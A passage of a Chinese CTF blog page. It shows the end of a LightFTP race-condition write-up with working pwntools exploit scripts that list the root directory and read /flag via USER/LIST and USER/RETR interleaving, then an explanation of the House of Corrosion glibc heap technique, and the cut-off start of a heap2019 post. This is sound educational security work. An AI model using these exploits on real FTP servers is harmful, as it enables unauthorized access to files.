<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpUSER</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( params == <span class="literal">NULL</span> )</span><br><span class="line">        <span class="keyword">return</span> sendstring(context, error501);</span><br><span class="line"></span><br><span class="line">    context-&gt;Access = FTP_ACCESS_NOT_LOGGED_IN;</span><br><span class="line"></span><br><span class="line">    writelogentry(context, <span class="string">&quot; USER: &quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">    <span class="built_in">snprintf</span>(context-&gt;FileName, <span class="keyword">sizeof</span>(context-&gt;FileName), <span class="string">&quot;331 User %s OK. Password required\r\n&quot;</span>, params);</span><br><span class="line">    sendstring(context, context-&gt;FileName);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Save login name to FileName for the next PASS command */</span></span><br><span class="line">    <span class="built_in">strcpy</span>(context-&gt;FileName, params);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>PFTPCONTEXT</code> 是一个指针，<code>ftpUSER</code> 和 <code>ftpLIST</code> 共享同一片空间的数据</li>
</ul>
<p>测试脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">p = remote(ip,<span class="number">2121</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;USER anonymous\r\n&quot;</span>)</span><br><span class="line">success(p.recv())</span><br><span class="line">p.send(<span class="string">&quot;PASS 123456\r\n&quot;</span>)</span><br><span class="line">success(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;EPSV\r\n&quot;</span>)</span><br><span class="line">ret = p.recv()</span><br><span class="line">success(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Entering Extended Passive Mode&quot;</span> <span class="keyword">in</span> ret:</span><br><span class="line">    parts = ret.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    pport = <span class="built_in">int</span>(parts[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;Passive port: %s&quot;</span> % pport)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;LIST \r\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;USER / \r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p2 = remote(ip,pport)</span><br><span class="line"></span><br><span class="line">success(p.recv())</span><br><span class="line">success(<span class="string">&quot;&lt;------------------------------------&gt;&quot;</span>)</span><br><span class="line">success(p2.recv())</span><br></pre></td></tr></table></figure>
<ul>
<li>结果：（这里直接使用主机来进行测试了）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">➜  NonHeavyFTP python <span class="built_in">exp</span>.py</span><br><span class="line">[+] Opening connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> on port <span class="number">2121</span>: Done</span><br><span class="line">[+] <span class="number">220</span> LightFTP server ready</span><br><span class="line">    <span class="number">331</span> User anonymous OK. Password required</span><br><span class="line">[+] <span class="number">230</span> User logged in, proceed.</span><br><span class="line">[+] <span class="number">229</span> <span class="function">Entering Extended Passive <span class="title">Mode</span> <span class="params">(|||<span class="number">33416</span>|)</span></span></span><br><span class="line"><span class="function">[+] Passive port: 33416</span></span><br><span class="line"><span class="function">[+] Opening connection to 127.0.0.1 on port 33416: Done</span></span><br><span class="line"><span class="function">[+] 150 File status okay</span>; about to open data connection.</span><br><span class="line">    <span class="number">331</span> User / OK. Password required</span><br><span class="line">[+] &lt;------------------------------------&gt;</span><br><span class="line">[+] drwxrwxrwt  <span class="number">25</span> <span class="number">0</span> <span class="number">0</span> <span class="number">12288</span> Jan <span class="number">12</span> <span class="number">13</span>:<span class="number">25</span> tmp</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">7</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> lib</span><br><span class="line">    drwxr-xr-x  <span class="number">142</span> <span class="number">0</span> <span class="number">0</span> <span class="number">12288</span> Jan <span class="number">12</span> <span class="number">11</span>:<span class="number">05</span> etc</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">10</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> libx32</span><br><span class="line">    drwxr-xr-x  <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">09</span> <span class="number">19</span>:<span class="number">48</span> srv</span><br><span class="line">    -rwxr-xr-x  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">14</span> Jan <span class="number">12</span> <span class="number">13</span>:<span class="number">20</span> flag</span><br><span class="line">    drwxrwxr-x  <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">12</span> cdrom</span><br><span class="line">    dr-xr-xr-x  <span class="number">400</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> Jan <span class="number">12</span> <span class="number">11</span>:<span class="number">00</span> proc</span><br><span class="line">    drwxr-xr-x  <span class="number">14</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Sep <span class="number">06</span> <span class="number">16</span>:<span class="number">40</span> usr</span><br><span class="line">    dr-xr-xr-x  <span class="number">13</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> Jan <span class="number">12</span> <span class="number">11</span>:<span class="number">00</span> sys</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> lib64</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Oct <span class="number">01</span> <span class="number">11</span>:<span class="number">00</span> opt</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">26</span> home</span><br><span class="line">    drwxr-xr-x  <span class="number">38</span> <span class="number">0</span> <span class="number">0</span> <span class="number">1040</span> Jan <span class="number">12</span> <span class="number">13</span>:<span class="number">21</span> run</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Jan <span class="number">12</span> <span class="number">13</span>:<span class="number">24</span> server</span><br><span class="line">    -rw-------  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">2147483648</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> swapfile</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">9</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> lib32</span><br><span class="line">    drwxr-xr-x  <span class="number">19</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4180</span> Jan <span class="number">12</span> <span class="number">11</span>:<span class="number">01</span> dev</span><br><span class="line">    drwx------  <span class="number">2</span> <span class="number">0</span> <span class="number">0</span> <span class="number">16384</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> lost+found</span><br><span class="line">    drwx------  <span class="number">6</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Sep <span class="number">01</span> <span class="number">23</span>:<span class="number">26</span> root</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">7</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> bin</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">37</span> media</span><br><span class="line">    drwxr-xr-x  <span class="number">12</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Sep <span class="number">24</span> <span class="number">10</span>:<span class="number">10</span> snap</span><br><span class="line">    drwxr-xr-x  <span class="number">5</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">29</span> <span class="number">06</span>:<span class="number">03</span> glibc</span><br><span class="line">    drwxr-xr-x  <span class="number">4</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Jan <span class="number">07</span> <span class="number">10</span>:<span class="number">01</span> boot</span><br><span class="line">    drwxr-xr-x  <span class="number">14</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">09</span> <span class="number">19</span>:<span class="number">54</span> var</span><br><span class="line">    drwxr-xr-x  <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4096</span> Aug <span class="number">28</span> <span class="number">22</span>:<span class="number">55</span> mnt</span><br><span class="line">    lrwxrwxrwx  <span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">8</span> Aug <span class="number">28</span> <span class="number">19</span>:<span class="number">09</span> sbin</span><br><span class="line">[*] Closed connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> port <span class="number">33416</span></span><br><span class="line">[*] Closed connection to <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> port <span class="number">2121</span></span><br></pre></td></tr></table></figure>
<ul>
<li>成功读取出主机的根目录文件</li>
</ul>
<p>接下来分析实现下载功能的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ftpRETR</span><span class="params">(PFTPCONTEXT context, <span class="keyword">const</span> <span class="keyword">char</span> *params)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 验证目标目录路径 */</span></span><br><span class="line">    ftp_effective_path(context-&gt;RootDir, context-&gt;CurrentDir, params, <span class="keyword">sizeof</span>(context-&gt;FileName), context-&gt;FileName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (stat(context-&gt;FileName, &amp;filestats) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( S_ISDIR(filestats.st_mode) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        sendstring(context, interm150);</span><br><span class="line">        writelogentry(context, <span class="string">&quot; RETR: &quot;</span>, (<span class="keyword">char</span> *)params);</span><br><span class="line">        context-&gt;WorkerThreadAbort = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 创建list_thread线程来执行RETR命令 */</span></span><br><span class="line">        context-&gt;WorkerThreadValid = pthread_create(&amp;tid, <span class="literal">NULL</span>, (<span class="keyword">void</span> * (*)(<span class="keyword">void</span> *))retr_thread, context);</span><br><span class="line">        </span><br><span class="line">        ......</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendstring(context, error550);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">retr_thread</span><span class="params">(PFTPCONTEXT context)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">volatile</span> SOCKET		clientsocket;</span><br><span class="line">    <span class="keyword">int</span>					sent_ok, f;</span><br><span class="line">    <span class="keyword">off_t</span>				offset;</span><br><span class="line">    <span class="keyword">ssize_t</span>				sz, sz_total;</span><br><span class="line">    <span class="keyword">size_t</span>				buffer_size;</span><br><span class="line">    <span class="keyword">char</span>				*buffer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span>		<span class="title">t</span>;</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">long</span> <span class="keyword">long</span>	lt0, lt1, dtx;</span><br><span class="line">    <span class="keyword">gnutls_session_t</span>	TLS_datasession;</span><br><span class="line"></span><br><span class="line">    pthread_mutex_lock(&amp;context-&gt;MTLock);</span><br><span class="line">    pthread_cleanup_push(cleanup_handler, context);</span><br><span class="line">    </span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line">    buffer = <span class="built_in">malloc</span>(TRANSMIT_BUFFER_SIZE);</span><br><span class="line">    <span class="keyword">while</span> (buffer != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        clientsocket = create_datasocket(context);</span><br></pre></td></tr></table></figure>
<p>下载函数 <code>ftpRETR</code> 中也有类似的条件竞争漏洞，可以用相同的方法来下载 flag 文件</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">p = remote(ip,<span class="number">2121</span>)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;USER anonymous\r\n&quot;</span>)</span><br><span class="line">success(p.recv())</span><br><span class="line">p.send(<span class="string">&quot;PASS 123456\r\n&quot;</span>)</span><br><span class="line">success(p.recv())</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;EPSV\r\n&quot;</span>)</span><br><span class="line">ret = p.recv()</span><br><span class="line">success(ret)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Entering Extended Passive Mode&quot;</span> <span class="keyword">in</span> ret:</span><br><span class="line">    parts = ret.split(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">    pport = <span class="built_in">int</span>(parts[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;Passive port: %s&quot;</span> % pport)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;RETR \r\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;USER /flag \r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p2 = remote(ip,pport)</span><br><span class="line"></span><br><span class="line">success(p.recv())</span><br><span class="line">success(<span class="string">&quot;&lt;------------------------------------&gt;&quot;</span>)</span><br><span class="line">success(p2.recv())</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这种题目就比较贴合现实漏洞利用了，涨见识了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/10/House%20Of%20Corrosion-%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/10/House%20Of%20Corrosion-%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">House Of Corrosion-原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-01-10 20:54:18 / Modified: 20:55:35" itemprop="dateCreated datePublished" datetime="2023-01-10T20:54:18+08:00">2023-01-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/HouseOfSeries/" itemprop="url" rel="index"><span itemprop="name">HouseOfSeries</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>1.5k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Corrosion"><a href="#House-Of-Corrosion" class="headerlink" title="House Of Corrosion"></a>House Of Corrosion</h2><p>House Of Corrosion 很早以前就出现了</p>
<p>其根本的思想就是通过往 <code>global_max_fast</code> 写入一个很大的值，来造成 <code>main_arena-&gt;fastbinsY</code> 数组溢出 </p>
<hr>
<h2 id="House-Of-Corrosion-原理"><a href="#House-Of-Corrosion-原理" class="headerlink" title="House Of Corrosion 原理"></a>House Of Corrosion 原理</h2><p>fastbinsY 是在 GLIBC 上储存 fastbin 不同大小链表头指针的一段空间，为大小从 0x20 开始的 fastbin 链表预留了十个指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p main_arena</span><br><span class="line">$<span class="number">1</span> = &#123;</span><br><span class="line">  mutex = <span class="number">0</span>,</span><br><span class="line">  flags = <span class="number">0</span>,</span><br><span class="line">  fastbinsY = &#123;<span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>&#125;,</span><br><span class="line">  top = <span class="number">0x557c160ef860</span>,</span><br><span class="line">  last_remainder = <span class="number">0x0</span>,</span><br><span class="line">  bins = &#123;......&#125;,</span><br><span class="line">  binmap = &#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">65536</span>, <span class="number">0</span>&#125;,</span><br><span class="line">  next = <span class="number">0x7f3a14524b20</span> &lt;main_arena&gt;,</span><br><span class="line">  next_free = <span class="number">0x0</span>,</span><br><span class="line">  attached_threads = <span class="number">1</span>,</span><br><span class="line">  system_mem = <span class="number">135168</span>,</span><br><span class="line">  max_system_mem = <span class="number">135168</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这意味着，如果有 SIZE 超过 0xb0 的堆块，那么这个堆块计算得到的索引值就会超出 fastbinsY 的最大范围，造成数组越界 </li>
</ul>
<p>用于决定 fastbin 大小的是 <code>global_max_fast</code>，我们只需要覆盖这个值，然后就可以溢出 <code>main_arena</code> 了</p>
<p>应用场景是：</p>
<ul>
<li>能够任意写一个大数据</li>
<li>能够泄露堆地址和 libc 基址</li>
<li>能够触发 IO 流（FSOP 或触发 <code>__malloc_assert</code>），执行 IO 相关函数</li>
</ul>
<h2 id="House-Of-Corrosion-利用姿势"><a href="#House-Of-Corrosion-利用姿势" class="headerlink" title="House Of Corrosion 利用姿势"></a>House Of Corrosion 利用姿势</h2><p>劫持 <code>global_max_fast</code> 为一个大数据，就可以从 <code>main_arena</code> 向下溢出，我们要覆盖的目标就是 <code>_IO_list_all</code></p>
<p>计算偏移：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;main_arena </span><br><span class="line">$<span class="number">1</span> = (malloc_state *) <span class="number">0x7f85c2d99b20</span> &lt;main_arena&gt;</span><br><span class="line">pwndbg&gt; p &amp;_IO_list_all</span><br><span class="line">$<span class="number">2</span> = (_IO_FILE_plus **) <span class="number">0x7f85c2d9a520</span> &lt;_IO_list_all&gt;</span><br><span class="line">pwndbg&gt; distance <span class="number">0x7f85c2d99b20</span> <span class="number">0x7f85c2d9a520</span></span><br><span class="line"><span class="number">0x7f85c2d99b20</span>-&gt;<span class="number">0x7f85c2d9a520</span> is <span class="number">0xa00</span> bytes (<span class="number">0x140</span> words)</span><br></pre></td></tr></table></figure>
<ul>
<li>先计算 <code>main_arena</code> 和 <code>_IO_list_all</code> 之间的偏移</li>
<li>把这个数值乘2就可以得到目标 size</li>
</ul>
<p>伪造 FILE 结构体，最后申请一个 chunk 用于触发 FSOP，调用链为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc_printerr -&gt; _IO_flush_all_lockp -&gt; _IO_overflow</span><br></pre></td></tr></table></figure>
<p>也可以触发 <code>__malloc_assert</code>，调用链为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__malloc_assert -&gt; __fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal</span><br></pre></td></tr></table></figure>
<h2 id="版本对-House-Of-Corrosion-的影响"><a href="#版本对-House-Of-Corrosion-的影响" class="headerlink" title="版本对 House Of Corrosion 的影响"></a>版本对 House Of Corrosion 的影响</h2><ul>
<li>libc 2.23 ：对 vtable 的位置没有检测，可以直接在任意可控位置伪造一个 vtable，直接写 <code>one_gadget</code> 就可以了</li>
<li>libc 2.24 及其以后：对 vtable 的范围添加了限制，需要利用偏移来调用具体的 vtable 函数</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/10/House%20Of%20Corrosion-2.23-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/01/10/House%20Of%20Corrosion-2.23-64/" class="post-title-link" itemprop="url">House Of Corrosion-2.23-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-01-10 20:18:36 / Modified: 20:20:16" itemprop="dateCreated datePublished" datetime="2023-01-10T20:18:36+08:00">2023-01-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>heap2019</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.23</span><span class="number">-0u</span>buntu11)</span> stable release version 2.23, by Roland McGrath et a</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">heap2019: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">309</span>ab353df629cf952a87aeff73a7a39f23f2570, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
